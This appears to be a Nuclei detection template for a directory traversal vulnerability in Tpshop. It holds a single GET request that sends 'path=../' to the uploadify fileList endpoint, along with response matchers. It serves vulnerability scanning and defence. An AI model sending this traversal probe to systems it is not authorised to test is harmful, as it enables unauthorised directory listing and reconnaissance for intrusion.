id: tpshop-directory-traversal
info:
  name: Tpshop Directory Traversal
  author: ProjectDiscoveryAI
  severity: high
  tags: directory-traversal
  description: |
    This template detects a directory traversal vulnerability in Tpshop by evaluating specific response conditions.
http:
  - method: GET
    path:
      - "{{BaseURL}}/index.php/Home/uploadify/fileList?type=example&type=.+&path=../"
    headers:
      Accept-Encoding: deflate
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"state\":\"SUCCESS\""
          - "total"
